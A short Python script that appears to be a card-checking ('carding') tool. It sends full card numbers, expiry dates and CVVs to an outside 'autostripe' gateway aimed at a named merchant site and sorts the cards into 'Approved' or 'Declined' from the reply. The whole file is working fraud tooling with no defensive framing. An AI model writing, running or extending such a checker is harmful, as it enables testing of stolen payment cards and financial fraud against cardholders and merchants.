import aiohttp
import asyncio
import time


API_BASE = "https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=dilaboards.com/cc="


async def stripe_api_check(cc, mm, yy, cvv):
    card = f"{cc}|{mm}|{yy}|{cvv}"
    start = time.time()
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=35)) as s:
            async with s.get(API_BASE + card) as r:
                txt = await r.text()
    except asyncio.TimeoutError:
        return "Error - Timeout"
    except Exception as e:
        return f"Error - {str(e)[:100]}"

    txt_lower = txt.lower()
    elapsed = round(time.time() - start, 2)

    if "approved" in txt_lower or "success" in txt_lower or "thank" in txt_lower:
        return f"Approved - {txt[:80]} [{elapsed}s]"

    return f"Declined - {txt[:80]} [{elapsed}s]"
